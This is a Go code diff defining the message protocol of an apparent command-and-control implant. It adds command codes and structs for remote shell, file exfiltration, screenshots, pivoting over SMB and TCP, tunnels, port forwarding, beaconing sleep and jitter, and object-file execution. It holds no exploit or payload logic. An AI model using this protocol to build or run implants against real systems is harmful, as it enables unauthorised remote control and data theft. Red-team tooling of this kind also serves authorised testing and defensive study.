@@ -26,14 +26,54 @@ func Unmarshal(data []byte, v interface{}) error {
 // in agent_types.go which survives protocol overlay replacement.
 
 const (
-	COMMAND_EXIT = 0
+	COMMAND_ERROR      = 0
+	COMMAND_PWD        = 1
+	COMMAND_CD         = 2
+	COMMAND_SHELL      = 3
+	COMMAND_EXIT       = 4
+	COMMAND_DOWNLOAD   = 5
+	COMMAND_UPLOAD     = 6
+	COMMAND_CAT        = 7
+	COMMAND_CP         = 8
+	COMMAND_MV         = 9
+	COMMAND_MKDIR      = 10
+	COMMAND_RM         = 11
+	COMMAND_LS         = 12
+	COMMAND_PS         = 13
+	COMMAND_KILL       = 14
+	COMMAND_ZIP        = 15
+	COMMAND_SCREENSHOT = 16
+	COMMAND_RUN        = 17
+	COMMAND_JOB_LIST   = 18
+	COMMAND_JOB_KILL   = 19
+	COMMAND_REV2SELF   = 20
+
+	COMMAND_DISKS      = 21
+	COMMAND_EXFIL      = 22
+	COMMAND_GETUID     = 23
+	COMMAND_LINK       = 24
+	COMMAND_PROFILE    = 25
+	COMMAND_SLEEP      = 26
+	COMMAND_BURST      = 27
+	COMMAND_TERMINATE  = 28
+	COMMAND_UNLINK     = 29
+	COMMAND_PIVOT_EXEC = 30
+
+	COMMAND_TUNNEL_START   = 31
+	COMMAND_TUNNEL_STOP    = 32
+	COMMAND_TUNNEL_PAUSE   = 33
+	COMMAND_TUNNEL_RESUME  = 34
+	COMMAND_TERMINAL_START = 35
+	COMMAND_TERMINAL_STOP  = 36
+	COMMAND_LPORTFWD_START = 37
+	COMMAND_LPORTFWD_STOP  = 38
+	COMMAND_RPORTFWD_START = 39
+	COMMAND_RPORTFWD_STOP  = 40
+	COMMAND_TUNNEL_REVERSE = 41
 
 	COMMAND_EXEC_BOF       = 50
 	COMMAND_EXEC_BOF_OUT   = 51
 	COMMAND_EXEC_BOF_ASYNC = 52
-
-	COMMAND_JOB_LIST = 60
-	COMMAND_JOB_KILL = 61
 )
 
 // ─── Wire types ────────────────────────────────────────────────────────────────
@@ -86,32 +126,138 @@ type AnsError struct {
 	Error string `msgpack:"error"`
 }
 
-// ─── Exfil type ────────────────────────────────────────────────────────────────
-
-type AnsExfil struct {
-	CommandId uint   `msgpack:"command_id"`
-	Data      []byte `msgpack:"data"`
+type AnsPwd struct {
+	Path string `msgpack:"path"`
 }
 
-// ─── BOF types (shared with protocol overlays) ─────────────────────────────────
-
-type ParamsExecBof struct {
-	Object   []byte `msgpack:"object"`
-	ArgsPack string `msgpack:"argspack"`
-	Task     string `msgpack:"task"`
+type ParamsCd struct {
+	Path string `msgpack:"path"`
 }
 
-type BofMsg struct {
-	Type int    `msgpack:"type"`
-	Data []byte `msgpack:"data"`
+type ParamsShell struct {
+	Program string   `msgpack:"program"`
+	Args    []string `msgpack:"args"`
 }
 
-type AnsExecBof struct {
-	Msgs []byte `msgpack:"msgs"`
+type AnsShell struct {
+	Output string `msgpack:"output"`
 }
 
-type AnsExecBofAsync struct {
-	Msgs   []byte `msgpack:"msgs"`
+type ParamsDownload struct {
+	Task string `msgpack:"task"`
+	Path string `msgpack:"path"`
+}
+
+type AnsDownload struct {
+	FileId   int    `msgpack:"id"`
+	Path     string `msgpack:"path"`
+	Size     int    `msgpack:"size"`
+	Content  []byte `msgpack:"content"`
+	Start    bool   `msgpack:"start"`
+	Finish   bool   `msgpack:"finish"`
+	Canceled bool   `msgpack:"canceled"`
+}
+
+type ParamsUpload struct {
+	Path    string `msgpack:"path"`
+	Content []byte `msgpack:"content"`
+	Finish  bool   `msgpack:"finish"`
+}
+
+type AnsUpload struct {
+	Path string `msgpack:"path"`
+}
+
+type ParamsCat struct {
+	Path string `msgpack:"path"`
+}
+
+type AnsCat struct {
+	Path    string `msgpack:"path"`
+	Content []byte `msgpack:"content"`
+}
+
+type ParamsCp struct {
+	Src string `msgpack:"src"`
+	Dst string `msgpack:"dst"`
+}
+
+type ParamsMv struct {
+	Src string `msgpack:"src"`
+	Dst string `msgpack:"dst"`
+}
+
+type ParamsMkdir struct {
+	Path string `msgpack:"path"`
+}
+
+type ParamsRm struct {
+	Path string `msgpack:"path"`
+}
+
+type ParamsLs struct {
+	Path string `msgpack:"path"`
+}
+
+type FileInfo struct {
+	Mode     string `msgpack:"mode"`
+	Nlink    int    `msgpack:"nlink"`
+	User     string `msgpack:"user"`
+	Group    string `msgpack:"group"`
+	Size     int64  `msgpack:"size"`
+	Date     string `msgpack:"date"`
+	Filename string `msgpack:"filename"`
+	IsDir    bool   `msgpack:"is_dir"`
+}
+
+type AnsLs struct {
+	Result bool   `msgpack:"result"`
+	Status string `msgpack:"status"`
+	Path   string `msgpack:"path"`
+	Files  []byte `msgpack:"files"`
+}
+
+type PsInfo struct {
+	Pid     int    `msgpack:"pid"`
+	Ppid    int    `msgpack:"ppid"`
+	Tty     string `msgpack:"tty"`
+	Context string `msgpack:"context"`
+	Process string `msgpack:"process"`
+}
+
+type AnsPs struct {
+	Result    bool   `msgpack:"result"`
+	Status    string `msgpack:"status"`
+	Processes []byte `msgpack:"processes"`
+}
+
+type ParamsKill struct {
+	Pid int `msgpack:"pid"`
+}
+
+type ParamsZip struct {
+	Src string `msgpack:"src"`
+	Dst string `msgpack:"dst"`
+}
+
+type AnsZip struct {
+	Path string `msgpack:"path"`
+}
+
+type AnsScreenshots struct {
+	Screens [][]byte `msgpack:"screens"`
+}
+
+type ParamsRun struct {
+	Program string   `msgpack:"program"`
+	Args    []string `msgpack:"args"`
+	Task    string   `msgpack:"task"`
+}
+
+type AnsRun struct {
+	Stdout string `msgpack:"stdout"`
+	Stderr string `msgpack:"stderr"`
+	Pid    int    `msgpack:"pid"`
 	Start  bool   `msgpack:"start"`
 	Finish bool   `msgpack:"finish"`
 }
@@ -125,13 +271,194 @@ type AnsJobList struct {
 	List []byte `msgpack:"list"`
 }
 
-const (
-	BOF_PACK = 102
+type ParamsJobKill struct {
+	Id string `msgpack:"id"`
+}
 
+type ParamsTunnelStart struct {
+	Proto     string `msgpack:"proto"`
+	ChannelId int    `msgpack:"channel_id"`
+	Address   string `msgpack:"address"`
+}
+
+type ParamsTunnelStop struct {
+	ChannelId int `msgpack:"channel_id"`
+}
+
+type ParamsTunnelPause struct {
+	ChannelId int `msgpack:"channel_id"`
+}
+
+type ParamsTunnelResume struct {
+	ChannelId int `msgpack:"channel_id"`
+}
+
+type ParamsTunnelReverse struct {
+	TunnelId int `msgpack:"tunnel_id"`
+	Port     int `msgpack:"port"`
+}
+
+type ParamsTerminalStart struct {
+	TermId  int    `msgpack:"term_id"`
+	Program string `msgpack:"program"`
+	Height  int    `msgpack:"height"`
+	Width   int    `msgpack:"width"`
+}
+
+type ParamsTerminalStop struct {
+	TermId int `msgpack:"term_id"`
+}
+
+type Job struct {
+	CommandId uint   `msgpack:"command_id"`
+	JobId     string `msgpack:"job_id"`
+	Data      []byte `msgpack:"data"`
+}
+
+type DriveInfo struct {
+	Name string `msgpack:"name"`
+	Type string `msgpack:"type"`
+}
+
+type AnsDisks struct {
+	Drives []byte `msgpack:"drives"`
+}
+
+type ParamsExfil struct {
+	FileId string `msgpack:"file_id"`
+	Action int    `msgpack:"action"`
+}
+
+type AnsExfil struct {
+	FileId string `msgpack:"file_id"`
+	State  int    `msgpack:"state"`
+}
+
+type AnsGetuid struct {
+	Username string `msgpack:"username"`
+	Domain   string `msgpack:"domain"`
+	Elevated bool   `msgpack:"elevated"`
+}
+
+type ParamsLinkSmb struct {
+	Target   string `msgpack:"target"`
+	Pipename string `msgpack:"pipename"`
+}
+
+type ParamsLinkTcp struct {
+	Target string `msgpack:"target"`
+	Port   int    `msgpack:"port"`
+}
+
+type AnsLink struct {
+	LinkType  int    `msgpack:"link_type"`
+	Watermark string `msgpack:"watermark"`
+	Beat      []byte `msgpack:"beat"`
+}
+
+type ParamsProfile struct {
+	SubCmd   int    `msgpack:"subcmd"`
+	IntValue int    `msgpack:"int_value"`
+	StrValue string `msgpack:"str_value"`
+}
+
+type AnsProfile struct {
+	SubCmd   int    `msgpack:"subcmd"`
+	IntValue int    `msgpack:"int_value"`
+	StrValue string `msgpack:"str_value"`
+}
+
+type ParamsRportfwdStart struct {
+	Lport   int    `msgpack:"lport"`
+	Fwdhost string `msgpack:"fwdhost"`
+	Fwdport int    `msgpack:"fwdport"`
+}
+
+type ParamsRportfwdStop struct {
+	Lport int `msgpack:"lport"`
+}
+
+type ParamsSleep struct {
+	Sleep  int `msgpack:"sleep"`
+	Jitter int `msgpack:"jitter"`
+}
+
+type AnsSleep struct {
+	Sleep  int `msgpack:"sleep"`
+	Jitter int `msgpack:"jitter"`
+}
+
+type ParamsBurst struct {
+	SubCmd  int `msgpack:"subcmd"`
+	Enabled int `msgpack:"enabled"`
+	Sleep   int `msgpack:"sleep"`
+	Jitter  int `msgpack:"jitter"`
+}
+
+type AnsBurst struct {
+	Enabled int `msgpack:"enabled"`
+	Sleep   int `msgpack:"sleep"`
+	Jitter  int `msgpack:"jitter"`
+}
+
+type ParamsUnlink struct {
+	Id string `msgpack:"id"`
+}
+
+type AnsUnlink struct {
+	PivotId   string `msgpack:"pivot_id"`
+	PivotType int    `msgpack:"pivot_type"`
+}
+
+type AnsPivotExec struct {
+	PivotId string `msgpack:"pivot_id"`
+	Data    []byte `msgpack:"data"`
+}
+
+type AnsTerminate struct {
+	Method int `msgpack:"method"`
+}
+
+type AnsTunnelStart struct {
+	ChannelId int  `msgpack:"channel_id"`
+	Success   bool `msgpack:"success"`
+}
+
+type AnsTunnelData struct {
+	ChannelId int    `msgpack:"channel_id"`
+	Data      []byte `msgpack:"data"`
+}
+
+type AnsTunnelClose struct {
+	ChannelId int `msgpack:"channel_id"`
+}
+
+type AnsTunnelReverse struct {
+	TunnelId  int  `msgpack:"tunnel_id"`
+	ChannelId int  `msgpack:"channel_id"`
+	Success   bool `msgpack:"success"`
+}
+
+type AnsTerminalStart struct {
+	TermId string `msgpack:"term_id"`
+}
+
+type AnsTerminalData struct {
+	TermId string `msgpack:"term_id"`
+	Data   []byte `msgpack:"data"`
+}
+
+type AnsTerminalClose struct {
+	TermId string `msgpack:"term_id"`
+}
+
+const (
 	CALLBACK_OUTPUT      = 0x0
 	CALLBACK_OUTPUT_OEM  = 0x1e
 	CALLBACK_OUTPUT_UTF8 = 0x20
 	CALLBACK_ERROR       = 0x0d
+	CALLBACK_CUSTOM      = 0x1000
+	CALLBACK_CUSTOM_LAST = 0x13ff
 
 	CALLBACK_AX_SCREENSHOT   = 0x81
 	CALLBACK_AX_DOWNLOAD_MEM = 0x82
